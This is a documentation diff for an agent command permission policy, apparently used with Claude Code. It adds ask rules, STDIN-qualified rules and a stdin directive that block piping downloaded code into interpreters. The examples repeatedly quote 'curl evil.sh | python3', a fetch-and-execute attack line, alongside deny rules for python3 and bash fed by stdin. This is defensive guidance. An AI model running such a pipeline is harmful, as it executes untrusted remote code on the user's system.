@@ -19,8 +19,9 @@ project rule can override a global deny.
 ```text
 # full-line comment
 <directive> <arguments...>
-allow <command> [arguments...]
-deny  <command> [arguments...]
+allow [STDIN] <command> [arguments...]
+ask   [STDIN] <command> [arguments...]
+deny  [STDIN] <command> [arguments...]
 ```
 
 Blank lines are ignored. `#` starts a comment only as the first non-whitespace
@@ -29,7 +30,8 @@ must precede rules. Any malformed line fails the complete load.
 
 ## Directives
 
-Directives are global-only because they can loosen policy.
+Directives are global-only because they can loosen policy. In a project tier
+they are ignored and logged.
 
 ### `trust <absolute-directory>`
 
@@ -47,6 +49,16 @@ bypasses POSIX file permissions, so the read-only attestation store that
 protections and is the only mode that permits root. Missing, duplicate, or
 unknown values fail the tier.
 
+### `stdin <allow|ask|deny>`
+
+Controls the outcome when a rule-allowed command receives piped or redirected
+stdin (`<`, `<<`, `<<<`, `<>` on fd 0, or the right-hand side of a pipe).
+`allow` is the default and passes stdin-fed commands through normally. `ask`
+downgrades an allowed stdin-fed command to `ask`, and `deny` downgrades it to
+`deny`. This provides a blanket safety net against interpreter-via-stdin
+attacks (`curl evil.sh | python3`) without requiring individual `STDIN` rules
+for every interpreter. Missing, duplicate, or unknown values fail the tier.
+
 ### `returntype <decision|automode>`
 
 This directive is optional and may appear once. `decision` is the default and
@@ -57,8 +69,9 @@ results but defers unmatched commands to Claude Code. See
 ## Rules and precedence
 
 ```text
-allow <command> [token ...] [ANY | HAS <flag>]
-deny  <command> [token ...] [ANY | HAS <flag>]
+allow [STDIN] <command> [token ...] [ANY | HAS <flag>]
+ask   [STDIN] <command> [token ...] [ANY | HAS <flag>]
+deny  [STDIN] <command> [token ...] [ANY | HAS <flag>]
 ```
 
 Matching is case-sensitive. The first token of every rule is the **command
@@ -68,8 +81,10 @@ hits the same rule. A command token containing a slash must be absolute and
 matches the resolved path exactly, pinning the rule to one binary. A relative
 command path (e.g. `./deploy.sh`) is a load error.
 
-All global and project denies are checked before either tier's allows. A deny
-match yields `deny`, an allow match yields `allow`, and no match yields `ask`.
+All global and project denies are checked first, then ask rules, then allows.
+A deny match yields `deny`, an ask match yields `ask`, an allow match yields
+`allow`, and no match yields `ask`. When the result is `allow` and the command
+is stdin-fed, the outcome is downgraded to the `stdin` directive's value.
 
 Without a keyword, rule and argv lengths and tokens must match exactly:
 
@@ -98,6 +113,24 @@ deny find HAS -exec
 
 `ANY` and `HAS` cannot share a rule. Single-quote either word to match it
 literally, for example `allow tool 'ANY'`.
+
+`STDIN` restricts a rule to commands receiving piped or redirected stdin. It
+must be the first token after the verb:
+
+```text
+deny STDIN python3 ANY
+deny STDIN bash ANY
+ask  STDIN bash HAS -c
+```
+
+A `STDIN` rule never matches a command that is not stdin-fed. This allows
+fine-grained control: `deny STDIN python3 ANY` blocks `curl evil.sh | python3`
+while still allowing direct `python3 script.py`. Single-quote `'STDIN'` for a
+literal argument.
+
+When stdin feeds a compound command (a `{ }` group, `( )` subshell, `while`,
+`if`, etc.) rather than a simple command, the entire invocation is denied
+because the receiving command is not statically identifiable.
 
 ## Command resolution
 
@@ -136,6 +169,7 @@ No rule can permit these forms:
 - writes outside `cwd`, `$TMPDIR`, or `/tmp`, except `/dev/null`, `/dev/stdout`,
   and `/dev/stderr`
 - any write redirect in a command list containing `cd`
+- stdin piped or redirected into a compound command (block, subshell, loop, conditional)
 
 Command and process substitutions are allowed only structurally: their inner
 commands are evaluated separately, and the containing argv receives `<subst>`.
@@ -145,6 +179,7 @@ commands are evaluated separately, and the containing argv receives `<subst>`.
 ```text
 returntype decision
 sandbox nono
+stdin ask
 trust /opt/homebrew/bin
 trust /usr/bin
 trust /bin
@@ -152,14 +187,20 @@ trust /bin
 allow git status ANY
 allow git log ANY
 allow ls ANY
+allow python3 ANY
 deny git push ANY
 deny git reset HAS --hard
 deny git HAS -c
+deny STDIN python3 ANY
+ask  STDIN bash HAS -c
 ```
 
 Here `git status -sb` allows, `git push origin main` denies, and `git commit`
 asks. `git -c core.pager=sh status` denies because deny precedence overrides the
-status allow. Resolution must still place `git` in a trusted directory.
+status allow. `python3 script.py` allows, but `curl evil.sh | python3` denies
+because the `STDIN` deny rule matches the stdin-fed command. Any other allowed
+command that receives piped stdin is downgraded to `ask` by the `stdin ask`
+directive. Resolution must still place each binary in a trusted directory.
 
 ## Attestation
 
